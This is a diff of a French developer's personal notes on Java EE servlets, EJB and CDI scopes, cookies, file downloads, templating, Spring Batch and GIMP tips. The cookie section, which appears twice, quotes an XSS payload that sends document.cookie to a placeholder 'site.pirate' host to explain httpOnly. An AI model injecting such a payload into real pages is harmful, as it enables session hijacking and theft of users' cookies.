@@ -1,5 +1,6 @@
-(?=.*ppk)(?=.*pem)
-        AFAIRE voir vert.x; kubernetes elastisearch, vuejs reacx
+(?=.*context)(?=.*root)
+AFAIRE :
+        voir vert.x; kubernetes elastisearch, vuejs reacx
         Afaire go, play, ngix 
         bootstrap=tweeter; materialUI
     base de donnée h2 pour les tests unitaires à capitaliser
@@ -1017,6 +1018,12 @@ Messagerie email :
 traitement en ligne des images :
   déflouter unblur
     http://www.photo-sharpen.com/
+gimp :
+	pour copier un caque dans une autre image:
+		draguer le caque dans le milieu de l'autre image
+	pour redimentioner transformer: 
+		shift+t
+		pour une redimension relative respectant la proportion: draguer un caré du bord tout en maintenant ctrl+shift enfoncés
 photoshop :
 justifier un texte: menu calques>texte>transformer en paragraphe > ouvrir fenetre pannel texte: les options justification sont activées: je peux focaliser la justfication sur les lignes selectionnees
 virer effet aimant magnet
@@ -2051,7 +2058,7 @@ pour jouer un fichier audio avec mediaplayer il vaut mieux proceder comme ca:
                                     <ShortName>Renault search</ShortName>
                                     <Description>Renault intranet recherche</Description>
                                     <InputEncoding>UTF-8</InputEncoding>
-                                    <Image width="16" height="16">data:image/png,%89PNG%0D%0A%1A%0A%00%00%00%0DIHDR%00%00%00%10%00%00%00%10%08%06%00%00%00%1F%F3%FFa%00%00%00%06bKGD%00%FF%00%FF%00%FF%A0%BD%A7%93%00%00%00%09pHYs%00%00%00H%00%00%00H%00F%C9k%3E%00%00%00%FAIDAT8%CB%9D%D3%B1q%C2%40%10%85%E1%0F%8F%0B%A0%04%97%00%1D%40%05%C6%01%B9%95*1%AA%C0C%05%E0%84%D4%E4%0A%0C%15H%EE%40%1D%98%12%D4%81%1D%E84%C8B%60%C9%2F9%AD%EE%EE%9F%DD%B7%7B%23%B0%DC%7D%A3D%22%8D%F7%06h%D4%00%D4*%02(%EF%03%B8%EB%F87Af%B9%7B%EF%03%B8o%C59%DE%A4%F1%E1%3F%25%EC%91%60%83%87%B0%FF%89m%F8%5Et%F9S%032%3C%E1%0B%E3%D6%99%02s%7C%848%91%C6E%1B0%C1%0B%9E%AFd%9A%E0%D4%80l%B1%96%C6eebE%9C%DC(%F51dRk%15%B2%FD%D5%85%B1a*%CF%80%AA%84%FC%C6%E1%23f%8Dx%8D)%E76n%10aq%C5%C4%03%B2%B0%26%D2%F8To%D6%80Y0q%8AW%97m%1C%23%EA%9A%CE%E6%20%AD%82%91%5D%83T%AA%BAp%A1%AE%B7Pk%2F%8D%A3%BF%9C%ECz%0B9%E6%7D.7K(%C3%3A%F89%FF%00_%82G%C3%D5%0E(%3E%00%00%00%00IEND%AEB%60%82</Image>
+                                    <Image width="16" height="16">data:image/png,%89PNG%0D%0A%1A%0A%00%00%00%0DIH...60%82</Image>
                                     <Url type="text/html" method="GET" template="http://phare.intra.renault.fr/rse/servlet/phare">
                                      <Param name="qtext" value="{searchTerms}"/>
                                     </Url>
@@ -2323,8 +2330,8 @@ Cycle de vie du CDI bean:
               – @CustomScoped pour que les beans soient stockees dans le FacesContext (qui a une duree de vie plus courte que RequestScope donc FC est plus rapide, bouffe moins de memoire)
               – @NoneScoped (si c un bean qui est reference par un autre bean qui lui est scoped)
               >> attention un bean ne peut pas referencer un autre bean si son scope est plus petit que le sien (sauf les @NoneScoped que tous peuvent referencer). Moi grand je ne peux pas referencer un petit. Seulement un plus grand que moi.
-                  @PostConstruct-->methode s'execute quand le bean est place dans son scope utile pour initialiser marche sur EJB (du coup sur @Singlton) mais ne marche pas sur CDI(sur?) du coup ApplicationScoped ne s'initialise pas avant d'être injectés. Du coup faire LINKobsgdgdgz
-                  public void debut() { ... }//ne doit pas thrower une exception
+                  @PostConstruct-->methode s'execute quand le bean est place dans son scope utile pour initialiser marche sur EJB (du coup sur @Singlton) et CDI mais attention avec ApplicationScoped chais pas pourquoi peut ne pas s'initialiser avant d'être injectés. Du coup faire LINKobsgdgdgz
+                  public void debut() { ... }//ne doit pas thrower une exception donc y mettre un trycatch
                   @PreDestroy--->methode s'execute quand le bean est retire du scope ou le scope est detruit.
                   public void fin() { ... }
                  @TransactionAttribute pouf gerer les transactions (marche aussi sur ejb de type  @Stateful, @Stateless and @Singleton @ManagedBean, @WebServlet, @WebListener, @WebFilter)           
@@ -2523,7 +2530,6 @@ config de la base de donnée donnee: en jee
       @Stateless // a mettre sous les datasource: c'est un ejb stateless
       public class DatasourceDefinition
       {
-
         sont equivalents dans web.xml de
                   <data-source>
                   <name>jdbc:hsqldb:mem:employees</name> // bien mettre mem sinon il fait chier avec les connexions mais c'est que pour tester car volatile
@@ -2537,7 +2543,8 @@ config de la base de donnée donnee: en jee
             DataSource myDB;
               ...
          }
-                
+ dans persistence.xml voir persistence.xml.
+ declarer en jndi sur le serveur.               
        
 backend 
 du code java pour aller afficher une page html sans rien faire de special
@@ -2556,9 +2563,9 @@ ejbs : ejb : beans EJB
   ------------------
   type            annotation
   // session bean est le seul ejb qu'on peut appeller remotely
-  SessionBean     @Stateless // n'a pas de donnees de l'interaction avec client c a d: seul un client accède à ce bean pour une seule tache, il n'est pas persistent, le bean est un webservice. On peut avoir plusieurs clients qui accedent a ce bean mais c'est pour chacun une relation 1client-1bean (pooled)                                        
-appelable par     @Statefull  // contient des donnees de l'interaction avec le client c a d: thread-safe: il cree autant d'instance indep que de client (c'est comme une session)
-un client               //stateless et statefull ne supportent pas d'acces concurents sur un meme bean.
+  SessionBean     @Stateless // a chaque appel de methode de l'ejb, le proxy va selectionner n'importe quel vrai bean derriere. un new ou un deja utilisé. C'est vraiment n'importe quel bean derriere.                                        
+appelable par     @Statefull  // a chaque appel de methode de l'ejb par une classe, le proxy choisit un et un seul bean pour cette classe. proxy=cebeanderriere. Ils sont marriés et fideles. Thread safe car il cree autant d'instance indep que de client (c'est comme une session). @Remove sert à detruire ce bean ejb sinon ne se detruira jamais tout seul.
+un client               //stateless et statefull sont threadsafe car à chaque appel, un seul thread a accès au bean
 en local          @Singleton // uniquement EJB 3.1: un seul ejb bean pour tout le monde.(tout les clients): cree par le container au demarrage sauf si lazy-loading
 ou remote                       peute etre sur classe meme un webservice. Peut aller de paire avec @Startup. LINKsngletn
                   @Local ---> l'accès à ces beans ne peut se faire que par d'autres beans du meme EJB (même contexte, même classLoader)
@@ -2605,10 +2612,11 @@ ou remote                       peute etre sur classe meme un webservice. Peut a
 //1 appel de mon bean d'ejb (qui est en fait un proxy cree par le container) par injection de dependance 
  public class Main
  {
+<<
   @Inject ou @EJB ou @Ressources (c'est pareil)// injection de dep: autant utiliser @Inject partout. Le container trouve tout seul grace au nom de ma classe mon bean EJB en cherchant tout seul dans le jndi. // il faut avoir qu'une seul sous classe de cette interface pour que ca marche
-                      // facultatif (name="monlookupnomdebean")
-  static MonInterfaceDeBeanDEJB ejbbean;
-  public static void main(String[] args)
+                        // facultatif (name="monlookupnomdebean" ou/et beanName="nomDeLaClasseSiC'estUneImplementationDinterfaceEtQuilYEnADautres")
+  static MonInterfaceDeBeanDEJB ejbbean; ATTENTION ca DOIT etre une interface si il y en a une. Si yen a pas ca marche avec la classe direct. Si je fais pas ça il n'arrive pas a injecter avec erreur WELD-001408
+==public static void main(String[] args)
   {
      String toto = ejbbean.calcule(4,2);
   }
@@ -2626,28 +2634,7 @@ ou remote                       peute etre sur classe meme un webservice. Peut a
     String toto = ejbbean.calcule(4,2);
   }
  } 
-//2 appel de mon bean d'ejb (qui est en fait un proxy cree par le container) remotely avec JNDI 
- public class Main
- {
-  static MonInterfaceDeBeanDEJB ejbbean;
-  public static void main(String[] args)
-  {
-    Context c = new InitialContext();
-    ejbbean = (MonInterfaceDeBeanDEJB) c.lookup("com.path.jndi.MonInterfaceDeBeanDEJB");
-    String toto = ejbbean.calcule(4,2);
-  }
- }
- 
-utilisation:
-CustomerHome home =// Get a reference to the CustomerHome object 
-Customer customer = home.create(new Integer(33));
-Name name = new Name("Richard","Wayne", "Monson-Haefel");
-customer.setName(name);
-Enumeration enumOfCustomers =home.findByZip(55410);
-Customer customer2 =home.findByPrimaryKey(new Integer(33));
-Name name2 = customer2.getName();
-System.out.println(name);// output is "Richard Wayne Monson-Haefel"
-
+ENLEVE EXPRES
 mvc : voir https://maarten.mulders.it/2018/09/a-first-look-at-mvc-1.0/ (parle de csrf) 
     krazo (projet eclipse). Pour les utliser sur differents serveurs voir https://www.mvc-spec.org/krazo/docs/install-javaee.html 
                             <dependency>
@@ -2700,7 +2687,7 @@ mvc : voir https://maarten.mulders.it/2018/09/a-first-look-at-mvc-1.0/ (parle de
             import java.io.*;
             import javax.servlet.*;
             import javax.servlet.http.*;
-            @WebServlet(value={"/sons/*"})( // pour ne pas avoir a declarer ma servlet dans web.xml                                        
+                                            
             public class HelloWWW extends HttpServlet {
               public void doGet(HttpServletRequest request,
                                 HttpServletResponse response)
@@ -2756,7 +2743,7 @@ mvc : voir https://maarten.mulders.it/2018/09/a-first-look-at-mvc-1.0/ (parle de
                     request.getServerName() // renvoit le domaine: monespacerh-dev.idkidscommunity.com
                     ou bien   request.getHeader("referer") ;// si c'est un src= et qu'on souhaite vraiment connaitre la page appelante. Mais peut etre que c Referer(R maj)
                     request.getProtocol() ... bof...)
-          recuperer un cookie a partir du request: afficher la liste des cookies : (isSecure(): le navigateur n'envoi le cookie dans reseau que si canal est securisé https (seuil "securisé" paramétrable sur le navigateur). (donc si http + secure impossible d'ouvrir session). httpOnly: empecher javascript d'acceder aux cookies LINKcooklskjhh (pirate peut injecter dans champ <img onload="document.location="http://site.pirate?c=document.cookie"); Host-only 
+          	recuperer un cookie a partir du request: afficher la liste des cookies : (isSecure(): le navigateur n'envoi le cookie dans reseau que si canal est securisé https (seuil "securisé" paramétrable sur le navigateur). (donc si http + secure impossible d'ouvrir session). httpOnly: empecher javascript d'acceder aux cookies LINKcooklskjhh (pirate peut injecter dans champ <img onload="document.location="http://site.pirate?c=document.cookie"); Host-only 
                                 Cookie[] cookies = request.getCookies();
                                   String cookieName = SAPCookie;
                                   String defaultValue = 1;
@@ -2768,6 +2755,7 @@ mvc : voir https://maarten.mulders.it/2018/09/a-first-look-at-mvc-1.0/ (parle de
                                       }
                                       return(defaultValue);
                                     }
+  		      methode plus rapide avec spring: WebUtils.getCookie(request, "nomdemoncookie");
             pour definir ajouter add un cookie:
                 response.addCookie(new Cookie("com.hraccess.portal.last_language", "fr_FR"));
                   
@@ -2791,14 +2779,17 @@ mvc : voir https://maarten.mulders.it/2018/09/a-first-look-at-mvc-1.0/ (parle de
           
           pour recuperer le nom de l'utilisateur connecte: 
               request.getUserPrincipal()
-          pour acceder à un fichier sous web-content webcontent en java: 
-          	request.getSession(false ou true).getServletContext().getRealPath("/resources/Tableau_de_bord.xls") // attention recree une  nouvelle session si elle n'existe plus (mettre false si on veut que ca renvoit null en cas de perte de session)
-                  // ou getServet().getServletContext()
-            	where /resources/Tableau_de_bord.xls is present inside the webcontent
-          	ou 
-              ClassificationNodeTest.class.getClassLoader().getResource(".")	ClassLoader.getResourceAsStream() ; ClassLoader.getResource() voir LINKgetRes9 verifier avec System.out.println("CLASSPATH: " + System.getProperty("java.class.path")); System.out.println("ClassLoader resource path: " + HRParameters.class.getClassLoader().getResource("hr-openhr-for-ta.properties")); voir LINKgetRes9 System.out.println("ClassLoader resource path: " + ClassLoader.getSystemResourceAsStream("hr-openhr-for-ta.properties"));
-              WelcomePresentor.class.getClassLoader().findResource("demo.css").getPath()
-                  upload du fichier cote serveur :
+pour acceder à un fichier sous web-content webcontent en java: 
+	request.getSession(false ou true).getServletContext().getRealPath("/resources/Tableau_de_bord.xls") // attention recree une  nouvelle session si elle n'existe plus (mettre false si on veut que ca renvoit null en cas de perte de session)
+        // ou getServet().getServletContext()
+  	where /resources/Tableau_de_bord.xls is present inside the webcontent
+	ou 
+    ClassificationNodeTest.class.getClassLoader().getResource(".")	ClassLoader.getResourceAsStream() ; ClassLoader.getResource() voir LINKgetRes9 verifier avec System.out.println("CLASSPATH: " + System.getProperty("java.class.path")); System.out.println("ClassLoader resource path: " + HRParameters.class.getClassLoader().getResource("hr-openhr-for-ta.properties")); voir LINKgetRes9 System.out.println("ClassLoader resource path: " + ClassLoader.getSystemResourceAsStream("hr-openhr-for-ta.properties"));
+    WelcomePresentor.class.getClassLoader().findResource("demo.css").getPath()
+pour recuperer une variable d'environnement qui est declaree dans web.xml:
+			pour recuperer le numero de version
+			String ttfPath = (String)ServiceLocator.getInstance().getRefByName("NOM_DE_LA_VARIABLE");
+                 upload du fichier cote serveur :
           si apres servlet 3.0)  completer avec LINKmultilkjfqsdf
                  je peux toujours faire request.getParameter("name") pour recuperer des parametres de l'url 
                   for (Part part : request.getParts()) { // il y a les fichiers en PJ puis les champs. Les fichiers en PJ toujours en premier.
@@ -2862,6 +2853,7 @@ mvc : voir https://maarten.mulders.it/2018/09/a-first-look-at-mvc-1.0/ (parle de
                       request.getParameterValues("nomDeMonSelect"); // recupere les parametres get ou post. Ne pas confondre avec request.getAttribute() request.setAttribute() c'est uniquement cote serveur: utilisable entre jsp et servlet aussi. Ne vient pas d'une requette request http. Peut etre un objet LINKrequgeurei
 
                   si je voulais renvoyer vers une jsp ou une page je ferais:request.getRequestDispatcher("(/WEB-INF?)/views/login.jsp").include(request, resp); ou si c'est vers un controlleur: voir plus haut LINKçç("'"'
+                        ATTENTION! doit être la dernière chose executee: pas de chain après ou d'autre redirection de request requette! java.lang.IllegalStateException: Impossible d'utiliser faire-suivre (forward) après que la reponse ait ete envoyee
                     response.setContentType("text/html"); (ou application/txt etc etc...) // on peut rajouter des trucs apres un .include (je crois)
                 PrintWriter out = response.getWriter();
                 out.println("<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.0 " +
@@ -2878,7 +2870,7 @@ mvc : voir https://maarten.mulders.it/2018/09/a-first-look-at-mvc-1.0/ (parle de
   redirige redirection web en java: (voir aussi LINKRedirectwebservice)
     HttpServletResponse servletResponse = (HttpServletResponse)response;
     servletResponse.sendRedirect("http://www.google.com"); Fait une redirection 302( pour faire une 301 faire response.setStatus(HttpServletResponse.SC_MOVED_PERMANENTLY);response.setHeader("Location", "http://somewhere/"); //pour un webservice voir //LINKredirwebservice998 
-    servletResponse.sendRedirect("/login");ou response.sendRedirect(request.getContextPath()+"/show.html"); // la requette request est renvoyee vers le client(url change sur browser navigateur) et redirige vers nouvelle url avec perte des params de la requette. !=.getRequestDispatcher("/urlduncontrolleurOuUneJSP.jsp").forward(req, resp) ça reste côte serveur: ça ne va pas vers navigateur client: les params de requette sont conserves. voir LINKçç("'"'
+    servletResponse.sendRedirect("/login");ou response.sendRedirect(request.getContextPath()+"/show.html"); // avec le contextroot la requette request est renvoyee vers le client(url change sur browser navigateur) et redirige vers nouvelle url avec perte des params de la requette. !=.getRequestDispatcher("/urlduncontrolleurOuUneJSP.jsp").forward(req, resp) ça reste côte serveur: ça ne va pas vers navigateur client: les params de requette sont conserves. voir LINKçç("'"'
           ATTENTION! forward et sendRedirect doivent être executées avant le commit de la response: pas de chain après ou d'autre redirection de requette! requette!  sinon j'aurais java.lang.IllegalStateException: Impossible d'utiliser faire-suivre (forward) après que la reponse ait ete envoyee
      fichier :
     pour renvoyer un fichier de la servlet (download): astuce, on peut aussi le zipper en java et envoyer le zip comme ca il n'y a pas de pb d'encodage
@@ -2959,7 +2951,7 @@ mvc : voir https://maarten.mulders.it/2018/09/a-first-look-at-mvc-1.0/ (parle de
     	        }
     	    }
                                    
-    Pour lire un fichier sur le serveur et le renvoyer pour ouverture dans le browser: 
+Pour lire un fichier sur le serveur et le renvoyer pour ouverture dans le browser: 
                     public static void downloadFichier(HttpServletRequest request, HttpServletResponse response, String type_PJ, String nomFichier) throws DaoException
                     	{
                     		String debut_msgConsole = "ERROR FROM PJsDao.downloadFichier()";
@@ -2993,8 +2985,6 @@ mvc : voir https://maarten.mulders.it/2018/09/a-first-look-at-mvc-1.0/ (parle de
                     			//BufferedInputStream  bis = new BufferedInputStream(stream);
                     			//outStream.write()
                     		}
-  
-        
 freemaker :
       <html>
           <head>
@@ -3044,7 +3034,7 @@ freemaker :
           
   Avec Velocity : (voir freemaker c'est mieux.)
     dans un fichier toto.vm
-    #set( $contextPath = $request.getContextPath() )
+    #set( $contextPath = $request.getContextPath() ) //contextroot
   <html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en">
         <link rel="stylesheet" href="${contextPath}/bower_components/bootstrap/dist/css/bootstrap.min.css">
         <link rel="stylesheet" href="${contextPath}/bower_components/font-awesome/css/font-awesome.min.css"/>
@@ -3110,8 +3100,6 @@ freemaker :
                         ou
                         
         
-
-  
   pour uploader un fichier audio du mobile vers le serveur: faire envoyer une requette requete POST http. voir LINKrequ939302 plus bas      
                      cote mobile: 
                   package pack.coderzheaven;
@@ -3320,242 +3308,6 @@ de la meme facon que ci dessus on peut faire du ssl en java:Moi client appel ser
     	}
       ... a finir...(projet OPA)
 
-      ////////////////////////
-
-            Avant: pour afficher une jsp depuis une servlet. Marche encore 
-            import java.io.*;
-            import javax.servlet.*;
-            import javax.servlet.http.*;
-                                            
-            public class HelloWWW extends HttpServlet {
-              public void doGet(HttpServletRequest request,
-                                HttpServletResponse response)
-                  throws ServletException, IOException {
-                  si je voulais renvoyer vers une jsp ou une page je ferais:request.getRequestDispatcher("(/WEB-INF?)/views/login.jsp").include(request, resp); ou si c'est vers un controlleur: voir plus haut LINKçç("'"'
-                        ATTENTION! doit être la dernière chose executee: pas de chain après ou d'autre redirection de request requette! java.lang.IllegalStateException: Impossible d'utiliser faire-suivre (forward) après que la reponse ait ete envoyee
-                response.setContentType("text/html"); (ou application/txt etc etc...)
-                PrintWriter out = response.getWriter();
-                out.println("<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.0 " +
-                                                    "Transitional//EN\">\n" +
-                            "<HTML>\n" +
-                            "<HEAD><TITLE>Hello WWW</TITLE></HEAD>\n" +
-                            "<BODY>\n" +
-                            "<H1>Hello WWW</H1>\n" +
-                            "</BODY></HTML>");
-              }
-            }
-
-Pour afficher les elements d'un request: lister parametres
-	out.println(request.getParameter("param1") + "\n");
-ou
-   Enumeration paramNames = request.getParameterNames();
-   while(paramNames.hasMoreElements()) {
-   String paramName = (String)paramNames.nextElement();
-   System.out.println("<TR><TD>" + paramName + "\n<TD>");
-ou 
-  String[] paramValues = request.getParameterValues(paramName);
-      etc etc...
-ou si c'est dans le payload de la request
-	       BufferedReader reader= req.getReader(); // si le payload est dans la request LINK564894 sinon si c'est des paramètres de request Utiliser plutot LINKee"(çà)" 
-         StringBuilder result = new StringBuilder();
-         String line;
-         while ((line = reader.readLine()) != null) {
-        	 System.out.println("pffff"+line); 
-             result.append(line);
-         }
-         System.out.println("mon json: "+result.toString()); // result c'est le json. 
-    ou voir LINKee"(çà)" si c'est multipart		 
-(Il y a aussi: recuperer l'url du request 
-request.getMethod() 
-request.getRequestURI() // pour connaitre l'url la page appelante. Exemple: /saml-landing
-request.getPathInfo() // recuperer le nom du fichier "/bip.wav"
-request.getRequestURL() // renvoit tout l'URL: http://monespacerh-dev.idkidscommunity.com/saml-landing. attention si existe reverse proxy ca renvoit le bon port et le bon host.(je crois) pas l'url origine initiale du client SINON:parametrer apache avec http://httpd.apache.org/docs/2.2/mod/mod_proxy.html#proxypreservehost
-request.getQueryString() // retourne l'url mais uniquement après "?"
-request.getScheme() // renvoit http ou https... attention si existe reverse proxy ca renvoit pas celui du reverseproxy mais celui du serveurMOI.(je crois)
-request.getServerName() // renvoit le domaine: monespacerh-dev.idkidscommunity.com
-ou bien   request.getHeader("referer") ;// si c'est un src= et qu'on souhaite vraiment connaitre la page appelante. Mais peut etre que c Referer(R maj)
-request.getProtocol() ... bof...)
-
-
-pour recuperer de manière sympa les parametres renvoyes par une page web:
-				protected String getStringParameter(String name){
-							return (String)getParameter(name, String.class);	
-						}
-						
-						protected Integer getIntegerParameter(String name){
-							return (Integer) getParameter(name, Integer.class);
-						}
-				appellent:
-				protected Object getParameter(String name, Class typeRetour){
-							try {
-								String value = request.getParameter(name);
-								Constructor constructeur = typeRetour.getConstructor(new Class[]{String.class});
-								return constructeur.newInstance(new Object[]{value});
-							} catch (Exception e) {
-								return null;
-							}
-						}
-
-  recuperer un cookie a partir du request: afficher la liste des cookies : (isSecure(): le navigateur n'envoi le cookie dans reseau que si canal est securisé https (seuil "securisé" paramétrable sur le navigateur). (donc si http + secure impossible d'ouvrir session). httpOnly: empecher javascript d'acceder aux cookies LINKcooklskjhh (pirate peut injecter dans champ <img onload="document.location="http://site.pirate?c=document.cookie"); Host-only 
-                      Cookie[] cookies = request.getCookies();
-                        String cookieName = SAPCookie;
-                        String defaultValue = 1;
-                        for ( int i=0; i<cookies.length; i++) {
-                              Cookie cookie = cookies[i];
-                              System.out.println(cookie.getPath());
-                              if (cookieName.equals(cookie.getName()))
-                                return(cookie.getValue());
-                            }
-                            return(defaultValue);
-                          }
-
-      methode plus rapide avec spring: WebUtils.getCookie(request, "nomdemoncookie");
-  pour definir ajouter add un cookie:
-      response.addCookie(new Cookie("com.hraccess.portal.last_language", "fr_FR"));
-  renvoyer les codes d'erreur ou de succes à la reponse:(200, 500 etc...) 
-      httpServletResponse.setStatus(HttpServletResponse.SC_INTERNAL_SERVER_ERROR);
-Super methode: recupere la session si il y en a une. Sinon, il en cree une nouvelle      
-    à toute request requete meme sans moimeme creer de session, le serveur defini un jsessionid dans le cookie par defaut: je le recup sur le serveur comme ça:
-        HttpSession session = servletRequest.getSession();
-    		String jsessionid = session.getId();
-        HttpSession session = request.getSession(true); //// attention recree une  nouvelle session si elle n'existe plus (mettre false si on ne veut pas ca) 
-        et ensuite on peut recuperer des variables liees à  cette session:
-          ShoppingCart previousItems =(ShoppingCart)session.getAttribute("previousItems"); (ou getValue... mais deprecie)
-         On peut tout recuperer avec l'objet session: le temps passe sur le site, le nombre de fois, la date d'acces au site....
-         request.isRequestedSessionIdValid() // est equivalent à request.getSession(false); je crois. mais si je veux savoir si l'utilisateur a ete authentifie je devrais ajouter une variable dans la session. Ou bien utiliser le request.getUserPrincipal()? 
-************************ 
-  recuperer les valeurs d'un select du request
-            request.getParameterValues("nomDeMonSelect"); // recupere les parametres get ou post. Ne pas confondre avec request.getAttribute() .setAttribute() c'est uniquement cote serveur: utilisable entre jsp et servlet aussi. Ne vient pas d'une requette request http. Peut etre un objet
-   		
-    		
-  pour voir l'adresse ip du client adresse ip du reverse proxy:
-      String ipadress = request.getHeader("X-FORWARDED-FOR"); // renvoit l'adresse ip de l'utilisateur client original
-      if (ipadress==null)
-      {
-        servletRequest.getRemoteAddr(); // ip du reverse proxy si il y en a 
-      }
-    ou recuperer adresse ip de l'appelant d'une servlet
-        servletRequest.getRemoteAddr()
-
-pour recuperer le nom de l'utilisateur connecte: 
-    request.getUserPrincipal()
-         
- fichier :
-pour renvoyer un fichier de la servlet (download): astuce, on peut aussi le zipper en java et envoyer le zip comme ca il n'y a pas de pb d'encodage
-    @WebServlet(value={"/sons/*"})(...)
-        String filename = URLDecoder.decode(request.getPathInfo().substring(1),"UTF-8");
-        File file = new File(app.getProps().getProperty("SOUND_PATH").concat(filename));
-        response.setHeader("Content-Type",getServletContext().getMimeType(filename));
-        response.setHeader("Content-Length",String.valueOf(file.length()));
-        response.setHeader("Content-Disposition","inline; filename=\""+file.getName()+"\"");
-        Files.copy(file.toPath(),response.getOutputStream()); // pour copier le contenu d'un fichier dans un outputstream
-    avant:
-	 String header = "attachement;filename="+fileName.substring(0,fileName.lastIndexOf("."));
-				response.addHeader("content-disposition", header);
-				response.setContentType("text");
-		ServletOutputStream outstr = response.getOutputStream();
-		FileInputStream lire = new FileInputStream(file);
-		//BufferedReader reader = new BufferedReader(new InputStreamReader(lire)); // en fait si ca marche pour les fichiers UTF-8 à lire (utiliser mark et reset si besoin faire l'equivalent de pos de RandomAccessFile mais bon courage:-))
-		NON!!! il faut utiliser les BufferedInputStream et output stream parce que bufferedreader encode! comme ca:
-		BufferedInputStream bis = new BufferedInputStream(lire);
-		NON: /*String ligne = "";
-		while ((ligne=reader.readLine())!=null){
-			ligne=ligne+System.getProperty("line.separator"); // LINKù*ù peut correspondre à ce quon envoit à java.exe via: -Dma.variable=/var/wtotototo...  a partir de java 5.1 on peut mettre "%n" (mettre les -D AVANT le -jar)
-			outstr.write(ligne.getBytes("ISO-8859-1")); ou outstr.write(ligne.getBytes());
-		}*/ voir ci dessous:
-autre facon PROPRE(pas de pb encodage) de faire un download a partir de l'objet struts formFile
-			public void upload(FormFile file, String location) throws Exception {
-				InputStream inputStream = file.getInputStream();
-				byte[] fileContents = new byte[file.getFileSize()];
-				inputStream.read(fileContents);
-				FileOutputStream outputFile = new FileOutputStream(new File(location + file.getFileName())); // on peut ecrire à la suite dans le fichier en rajouter un argument "append" à true
-				OutputStream fos = new BufferedOutputStream(outputFile);
-				fos.write(fileContent);
-				fos.close();	    
-			
- 
-Pour recuperer telecharger downloader un fichier java à partir d'une url faire une requete http lien et stocker ce fichier localement:
-	 public static void urlFileToLocalFile(String urlFullpath, String localFullPath)
-	    {
-	        InputStream input = null;
-	        FileOutputStream writeFile = null;
-
-	        try
-	        {
-	        //requete requette get
-	            URL url = new URL(urlFullpath);
-	            URLConnection connection = url.openConnection();
-	            int fileLength = connection.getContentLength();
-
-	            if (fileLength == -1)
-	            {
-	                System.out.println("Invalide URL or file.");
-	                return;
-	            }
-
-	            input = connection.getInputStream();
-	            String fileName = url.getFile().substring(url.getFile().lastIndexOf('/') + 1);
-	            writeFile = new FileOutputStream(localFullPath); // on peut ecrire à la suite dans le fichier en rajouter un argument "append" à true
-	            byte[] buffer = new byte[1024];
-	            int read;
-
-	            while ((read = input.read(buffer)) > 0)
-	                writeFile.write(buffer, 0, read);
-	            writeFile.flush();
-	        }
-	        catch (IOException e)
-	        {
-	            System.out.println("Error while trying to download the file.");
-	            e.printStackTrace();
-	        }
-	        finally
-	        {
-	            try
-	            {
-	                writeFile.close();
-	                input.close();
-	            }
-	            catch (IOException e)
-	            {
-	                e.printStackTrace();
-	            }
-	        }
-	    }
-                                   
-Pour lire un fichier sur le serveur et le renvoyer pour ouverture dans le browser: 
-                    public static void downloadFichier(HttpServletRequest request, HttpServletResponse response, String type_PJ, String nomFichier) throws DaoException
-                    	{
-                    		String debut_msgConsole = "ERROR FROM PJsDao.downloadFichier()";
-                    		try
-                    		{
-                    		byte[] bytes = Files.readAllBytes(Paths.get(unObjetURL.getPath())));
-                    		avant: 
-                    			String filePath = getUploadDirectory(request) + "/" + type_PJ + "/" + nomFichier ;
-                    			FileInputStream stream = new FileInputStream(filePath); //chemin absolu necessaire
-                    			byte buf[] = new byte[stream.available()];
-                    			stream.read(buf);
-                    			response.reset();
-                    			response.setHeader("Expires", "0") ;
-                    			response.setHeader("Cache-Control","must-revalidate, post-check=0, pre-check=0, public");
-                    			
-                    			if(StringHelper.getExtensionFichier(nomFichier).equalsIgnoreCase("html"))
-                    			{
-                    				response.setContentType("text/html");
-                    			}
-                    			else
-                    			{
-                    				response.setContentType("application/x-file-download");
-                    				response.setHeader("Content-Disposition", "attachment; filename=" + nomFichier);
-                    			}
-                    			
-                    			ServletOutputStream outStream = response.getOutputStream();
-                    			outStream.write(buf) ;
-                    			outStream.flush();
-                    			stream.close();// pas besoin si je fais try(Writer writer = new FileWriter(unfichier)){
-                    			outStream.close();
-                    			//BufferedInputStream  bis = new BufferedInputStream(stream);
-                    			//outStream.write()
-                    		}
 microservices :
     bonnes pratiques
 
@@ -5711,7 +5463,6 @@ Springbatch : spring-batch : spring batch :
 		</property> 
 	</bean>
 
-            
 Partitionner :divise : diviser :par bloc d'items. P Creer map d'ExecutionContext=1session(key/value) pour 1 step.
     public class ColumnRangePartitioner implements Partitioner 
     {
@@ -6707,7 +6458,6 @@ Spring : XML STYLE
                               mesmessages.properties                        
                                     Size.student.sonchamp="titit{min} ljksdflo {max} sdlksd" voir @size
                                     Size.autrecledobjet.sonchamp="titit{0} ljksdflo {1} sdlksd{2} 0 = champ, 1=min,2=max voir @size                                    
-
 Spring-batch :
     voir ci dessous spring-batch-tester tests : test :
         pour tester un job ou un step:
@@ -6985,7 +6735,6 @@ Spring-batch :
                                                           departure.setPlace(pe.extractData(resultSet));
                                                           return departure ;
                                                       }
-      
 jsf2 : jsf : ---------DEBUTBEURK----------
 faire des boucles loops  foreach:
      xmlns:ui="http://java.sun.com/jsf/facelets"
@@ -7588,6 +7337,360 @@ Bouton submit non ajax:
         <h:outputText value="#{myBean.myProperty}" id="resultId"/>.
 ------------FIN BEURK 
 
+MCD/MPD :
+      forte faible
+    esclav    maitre  
+     jai n   j'ai un
+      X,n -> 0,1
+      0,1 -> 1,1
+      1,1 <-> 1,1 faire une seule table
+        exequo
+      X,n-><-X,n
+      
+  bonne pratique gestion des rôles droits etc... LINKsecurlsjfg
+      voici les tables a creer:  USER    GROUPE                              PERMISSION(role)     USER-GROUPE      USER-PERMISSION(role)   GROUPE-PERMISSION(role)     
+                                  |       |                                         |              |                         |
+                               sont def ds le realm(genre login-config.xml)         |             ce mapping se defini au niveau du serveur (genre dans glassfish-web.xml)
+                                                                                se retrouvent dans web.xml>security-role
+JPA : Specification d'ORM. Implementé par hibernate, eclipselink...
+    pour faire du reverse engineering java vers base de donnee java2db
+    monProjet>Properties>Ajouter Facelets JPA; //bof 
+    Recuperer dans ecolipse Help>Update>Plugin Hibernate tools (http://download.jboss.org/jbosstools/updates/stable/indigo)
+    ouvrir console Hibernate et configurer une connection à une base
+    Clic droit sur mon projet > JAP > faire le reverseEngeniring
+    fichier resources/META-INF/persistence.xml marche bien. sinon ou mais pas sur dutout: WEB-INF/persistence.xml. Ce fichier DOIT etre dans le jar ou le war qui contient les @Entity
+    <persistence> 
